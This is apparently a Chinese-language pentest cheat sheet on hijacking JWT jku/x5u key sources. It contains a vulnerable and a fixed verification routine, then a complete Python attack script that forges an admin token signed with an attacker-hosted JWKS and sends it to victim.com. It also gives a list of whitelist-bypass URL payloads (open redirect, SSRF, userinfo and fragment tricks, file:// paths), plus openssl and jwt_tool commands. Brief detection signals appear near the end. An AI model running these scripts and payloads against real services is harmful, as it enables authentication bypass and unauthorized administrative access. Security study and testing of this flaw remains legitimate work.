# JWT `jku` / `x5u` 密钥源劫持

## 原理

`jku`（JWK Set URL）和 `x5u`（X.509 URL）告诉验证方去哪找公钥。如果服务端**不检查 URL 是否可信**，攻击者指定自己服务器上的 JWKS，用对应的私钥签名，验证方取回攻击者的公钥后自然验证通过。

```
┌──────────────────────────────────────────────────────────────┐
│ 正常流程                                                      │
│                                                               │
│   Client ──[jku: https://trusted.com/jwks.json]──▶ Server    │
│   (用 trusted.com 的私钥签名)         │                        │
│                                       GET jwks.json           │
│                                       ◀─── PK_trusted ─────  │
│                                       verify(PK_trusted)     │
│                                       ✓                       │
├──────────────────────────────────────────────────────────────┤
│ 攻击流程                                                      │
│                                                               │
│   Attacker ──[jku: https://evil.com/jwks.json]──▶ Server     │
│   (用 evil.com 的私钥签名)              │                      │
│                                          GET jwks.json        │
│                                          ◀─── PK_evil ────── │
│                                          verify(PK_evil)     │
│                                          ✓ → 绕过!            │
└──────────────────────────────────────────────────────────────┘
```

---

## 伪代码：漏洞逻辑

```python
# 漏洞代码 — 未验证 jku 来源
def verify_token(token):
    header = jwt_decode_header(token)

    if header.get('jku'):
        # BUG: 直接信任 header 中的 jku URL
        jwks = requests.get(header['jku']).json()
        key = jwk_to_pem(jwks['keys'][0])
    elif header.get('x5u'):
        cert = requests.get(header['x5u']).content
        key = x509_to_pem(cert)
    elif header.get('kid'):
        key = get_key_from_db(header['kid'])
    else:
        key = default_public_key

    return jwt_verify(token, key)  # 用攻击者提供的公钥验证
```

```python
# 正确代码 — 白名单 + URL 验证
TRUSTED_JKU_HOSTS = ['trusted.auth.com', 'auth.internal']

def verify_token(token):
    header = jwt_decode_header(token)
    if header.get('jku'):
        url = urlparse(header['jku'])
        if url.hostname not in TRUSTED_JKU_HOSTS:
            raise InvalidJWKSError(f"Untrusted jku host: {url.hostname}")
        if url.scheme != 'https':
            raise InvalidJWKSError("jku must use HTTPS")
    # ... 继续验证
```

---

## 伪代码：攻击脚本

```python
# attack_jku_hijack.py
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
import json, base64, requests

# ─── 步骤 1: 生成攻击者自己的 RSA 密钥对 ───
def generate_attacker_keypair():
    private = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public = private.public_key()
    return private, public

# ─── 步骤 2: 将公钥转为 JWK 格式 ───
def public_key_to_jwk(public_key) -> dict:
    """
    RSA 公钥 → JWK 格式
    """
    numbers = public_key.public_numbers()
    n_b64 = base64.urlsafe_b64encode(
        numbers.n.to_bytes((numbers.n.bit_length() + 7) // 8, 'big')
    ).rstrip(b'=').decode()
    e_b64 = base64.urlsafe_b64encode(
        numbers.e.to_bytes((numbers.e.bit_length() + 7) // 8, 'big')
    ).rstrip(b'=').decode()

    return {
        "kty": "RSA",
        "use": "sig",
        "kid": "attacker-key-1",
        "n": n_b64,
        "e": e_b64,
        "alg": "RS256"
    }

# ─── 步骤 3: 托管 JWKS ───
def host_jwks(jwk: dict) -> str:
    """
    将 JWKS 托管到攻击者可控的服务器
    返回可访问的 URL
    """
    jwks = {"keys": [jwk]}
    jwks_json = json.dumps(jwks)

    # 方式 A: 用 ngrok/localtunnel 暴露本地
    # 方式 B: 上传到 GitHub Pages / S3 / Pastebin
    # 方式 C: 用 pipedream.com / webhook.site 捕获请求
    # 方式 D: 自建服务器

    # 假设我们已有一个可控域名
    with open("/var/www/html/jwks.json", "w") as f:
        f.write(jwks_json)
    return "https://attacker.com/jwks.json"

# ─── 步骤 4: 构造恶意 JWT ───
def forge_with_jku(payload: dict, private_key, jku_url: str) -> str:
    """
    用攻击者私钥签名，jku 指向自己的 JWKS
    """
    import jwt as pyjwt
    token = pyjwt.encode(
        payload,
        private_key,
        algorithm="RS256",
        headers={"jku": jku_url, "kid": "attacker-key-1"}
    )
    return token

# ─── 攻击入口 ───
private_key, public_key = generate_attacker_keypair()
jwk = public_key_to_jwk(public_key)
jku_url = host_jwks(jwk)

admin_token = forge_with_jku(
    payload={"sub": "admin", "role": "admin", "exp": 9999999999},
    private_key=private_key,
    jku_url=jku_url
)

resp = requests.get("https://victim.com/api/admin",
    headers={"Authorization": f"Bearer {admin_token}"})
print(f"[+] Status: {resp.status_code}")
```

---

## 绕过 jku URL 白名单

```python
# 常见白名单绕过技术

# 1. 子域名欺骗（如果白名单只检查后缀）
#    白名单: *.trusted.com
#    → jku: https://trusted.com.evil.com/jwks.json

# 2. 开放重定向利用
#    如果 trusted.com 上有开放重定向:
#    → jku: https://trusted.com/redirect?url=https://evil.com/jwks.json

# 3. SSRF 利用
#    如果 trusted.com 有 SSRF:
#    → jku: https://trusted.com/fetch?url=http://internal/jwks

# 4. URL parser 差异
#    → jku: https://trusted.com@evil.com/jwks.json    (userinfo 混淆)
#    → jku: https://trusted.com#@evil.com/jwks.json   (fragment 混淆)
#    → jku: https://evil.com/..trusted.com/jwks.json  (路径混淆)

# 5. 协议降级
#    如果只检查 host 不检查 scheme:
#    → jku: http://evil.com/jwks.json  (可能不要求 TLS)
```

### URL 混淆 Payload 字典

```text
# jku / x5u URL 混淆列表
https://trusted.com.attacker.com/jwks.json
https://trusted.com%40attacker.com/jwks.json
https://attacker.com/trusted.com/jwks.json
https://trusted.com/redirect?url=https://attacker.com/jwks.json
https://trusted.com#@attacker.com/jwks.json
http://localhost:8080/.well-known/jwks.json
file:///etc/ssl/certs/jwt-public.pem
https://webhook.site/<uuid>  # 用于观察是否有请求过来
```

---

## `x5u` 专用攻击

```bash
# x5u 指向 X.509 证书。攻击流程类似 jku，但需要提供证书

# 1. 生成自签名证书
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes \
  -subj "/CN=attacker"

# 2. 从证书提取公钥用于签名
openssl x509 -in cert.pem -pubkey -noout > pubkey.pem

# 3. 托管 cert.pem 到可控服务器
# 4. 用私钥签名 JWT，x5u 指向 cert.pem URL
```

---

## 检测信号

- Header 包含 `jku` 或 `x5u` 字段
- 修改 `jku`/`x5u` 值后，错误信息变更为证书/密钥相关错误
- 攻击者 Web 服务器收到来自目标 IP 的 JWKS/证书请求 → 确认漏洞
- 服务端响应时间增加（去外部取 JWKS 的网络延迟）

## 工具命令

```bash
# jwt_tool jku 注入
python3 jwt_tool.py <token> -X i -pk attacker_private.pem

# 生成 RSA 密钥对
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# 托管 JWKS (临时)
python3 -m http.server 8888
# 然后将 jwks.json 放在当前目录，ngrok http 8888

# 观察是否有请求过来
python3 -m http.server 8888 2>&1 | tee access.log
```
